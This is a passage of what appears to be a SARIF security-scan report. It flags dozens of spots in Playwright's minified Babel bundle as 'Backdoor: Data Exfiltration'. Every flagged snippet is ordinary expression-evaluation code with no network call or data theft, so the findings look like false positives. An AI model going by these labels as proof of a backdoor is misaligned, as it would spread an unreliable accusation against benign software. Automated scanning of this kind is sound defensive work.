          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6962,
                  "endLine": 31,
                  "endColumn": 6967,
                  "snippet": {
                    "text": "),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left",
                    "rendered": {
                      "text": "),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left",
                      "markdown": "`),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:void 0}}if(e.isBinaryExpression()){let r=gr(e.get(\"left`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6908,
                  "endLine": 31,
                  "endColumn": 6913,
                  "snippet": {
                    "text": " i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:v",
                    "rendered": {
                      "text": " i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:v",
                      "markdown": "` i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||i:void 0;case\"&&\":return t.confident=s&&(!n||a),t.confident?n&&i:void 0;case\"??\":return t.confident=s&&(n!=null||a),t.confident?n!=null?n:i:v`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6767,
                  "endLine": 31,
                  "endColumn": 6772,
                  "snippet": {
                    "text": "rn r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||",
                    "rendered": {
                      "text": "rn r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||",
                      "markdown": "`rn r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"left\"),t),s=t.confident;t.confident=r;let i=gr(e.get(\"right\"),t),a=t.confident;switch(e.node.operator){case\"||\":return t.confident=s&&(!!n||a),t.confident?n||`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6612,
                  "endLine": 31,
                  "endColumn": 6617,
                  "snippet": {
                    "text": "n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"lef",
                    "rendered": {
                      "text": "n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"lef",
                      "markdown": "`n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.deopt,t);return}l=l.value,r[a]=l}return r}if(e.isLogicalExpression()){let r=t.confident,n=gr(e.get(\"lef`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6511,
                  "endLine": 31,
                  "endColumn": 6516,
                  "snippet": {
                    "text": "ator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.de",
                    "rendered": {
                      "text": "ator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.de",
                      "markdown": "`ator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evaluate(),!a.confident){Ln(a.deopt,t);return}a=a.value}else i.isIdentifier()?a=i.node.name:a=i.node.value;let l=s.get(\"value\").evaluate();if(!l.confident){Ln(l.de`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6353,
                  "endLine": 31,
                  "endColumn": 6358,
                  "snippet": {
                    "text": ";let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;switch(e.node.operator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evalu",
                    "rendered": {
                      "text": ";let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;switch(e.node.operator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evalu",
                      "markdown": "`;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;switch(e.node.operator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"elements\");for(let s of n){let i=s.evaluate();if(i.confident)r.push(i.value);else{Ln(i.deopt,t);return}}return r}if(e.isObjectExpression()){let r={},n=e.get(\"properties\");for(let s of n){if(s.isObjectMethod()||s.isSpreadElement()){Ln(s,t);return}let i=s.get(\"key\"),a;if(s.node.computed){if(a=i.evalu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 6061,
                  "endLine": 31,
                  "endColumn": 6066,
                  "snippet": {
                    "text": ">0||e.node.start<r.path.node.end){Ln(r.path,t);return}if(r.hasValue)return r.value}let n=e.node.name;if(xA.has(n)){if(!r)return xA.get(n);Ln(r.path,t);return}let s=e.resolve();if(s===e){Ln(e,t);return}else return gr(s,t)}if(e.isUnaryExpression({prefix:!0})){if(e.node.operator===\"void\")return;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;switch(e.node.operator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"element",
                    "rendered": {
                      "text": ">0||e.node.start<r.path.node.end){Ln(r.path,t);return}if(r.hasValue)return r.value}let n=e.node.name;if(xA.has(n)){if(!r)return xA.get(n);Ln(r.path,t);return}let s=e.resolve();if(s===e){Ln(e,t);return}else return gr(s,t)}if(e.isUnaryExpression({prefix:!0})){if(e.node.operator===\"void\")return;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;switch(e.node.operator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"element",
                      "markdown": "`>0||e.node.start<r.path.node.end){Ln(r.path,t);return}if(r.hasValue)return r.value}let n=e.node.name;if(xA.has(n)){if(!r)return xA.get(n);Ln(r.path,t);return}let s=e.resolve();if(s===e){Ln(e,t);return}else return gr(s,t)}if(e.isUnaryExpression({prefix:!0})){if(e.node.operator===\"void\")return;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;switch(e.node.operator){case\"!\":return!n;case\"+\":return+n;case\"-\":return-n;case\"~\":return~n;case\"typeof\":return typeof n}}if(e.isArrayExpression()){let r=[],n=e.get(\"element`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5891,
                  "endLine": 31,
                  "endColumn": 5896,
                  "snippet": {
                    "text": "&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier()){let r=e.scope.getBinding(e.node.name);if(r){if(r.constantViolations.length>0||e.node.start<r.path.node.end){Ln(r.path,t);return}if(r.hasValue)return r.value}let n=e.node.name;if(xA.has(n)){if(!r)return xA.get(n);Ln(r.path,t);return}let s=e.resolve();if(s===e){Ln(e,t);return}else return gr(s,t)}if(e.isUnaryExpression({prefix:!0})){if(e.node.operator===\"void\")return;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;swi",
                    "rendered": {
                      "text": "&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier()){let r=e.scope.getBinding(e.node.name);if(r){if(r.constantViolations.length>0||e.node.start<r.path.node.end){Ln(r.path,t);return}if(r.hasValue)return r.value}let n=e.node.name;if(xA.has(n)){if(!r)return xA.get(n);Ln(r.path,t);return}let s=e.resolve();if(s===e){Ln(e,t);return}else return gr(s,t)}if(e.isUnaryExpression({prefix:!0})){if(e.node.operator===\"void\")return;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;swi",
                      "markdown": "`&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier()){let r=e.scope.getBinding(e.node.name);if(r){if(r.constantViolations.length>0||e.node.start<r.path.node.end){Ln(r.path,t);return}if(r.hasValue)return r.value}let n=e.node.name;if(xA.has(n)){if(!r)return xA.get(n);Ln(r.path,t);return}let s=e.resolve();if(s===e){Ln(e,t);return}else return gr(s,t)}if(e.isUnaryExpression({prefix:!0})){if(e.node.operator===\"void\")return;let r=e.get(\"argument\");if(e.node.operator===\"typeof\"&&(r.isFunction()||r.isClass()))return\"function\";let n=gr(r,t);if(!t.confident)return;swi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5398,
                  "endLine": 31,
                  "endColumn": 5403,
                  "snippet": {
                    "text": "t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||i===\"string\")&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier()){let r=e.scope.ge",
                    "rendered": {
                      "text": "t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||i===\"string\")&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier()){let r=e.scope.ge",
                      "markdown": "`t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||i===\"string\")&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier()){let r=e.scope.ge`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5378,
                  "endLine": 31,
                  "endColumn": 5383,
                  "snippet": {
                    "text": "e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||i===\"string\")&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier",
                    "rendered": {
                      "text": "e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||i===\"string\")&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier",
                      "markdown": "`e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||i===\"string\")&&a!=null&&(typeof a==\"number\"||typeof a==\"string\"))return s[a]}}if(e.isReferencedIdentifier`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5273,
                  "endLine": 31,
                  "endColumn": 5278,
                  "snippet": {
                    "text": ".isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||",
                    "rendered": {
                      "text": ".isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||",
                      "markdown": "`.isIdentifier()&&n===\"String\"&&!e.scope.getBinding(n)&&s.isIdentifier()&&s.node.name===\"raw\")return PA(e,e.node.quasi.quasis,t,!0)}if(e.isConditionalExpression()){let r=gr(e.get(\"test\"),t);return t.confident?gr(r?e.get(\"consequent\"):e.get(\"alternate\"),t):void 0}if(e.isExpressionWrapper())return gr(e.get(\"expression\"),t);if(e.isMemberExpression()&&!e.parentPath.isCallExpression({callee:e.node})){let r=e.get(\"property\"),n=e.get(\"object\");if(n.isLiteral()){let s=n.node.value,i=typeof s,a=null;if(e.node.computed){if(a=gr(r,t),!t.confident)return}else r.isIdentifier()&&(a=r.node.name);if((i===\"number\"||`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 5207,
                  "endLine": 31,
                  "endColumn": 5212,
                  "snippet": {
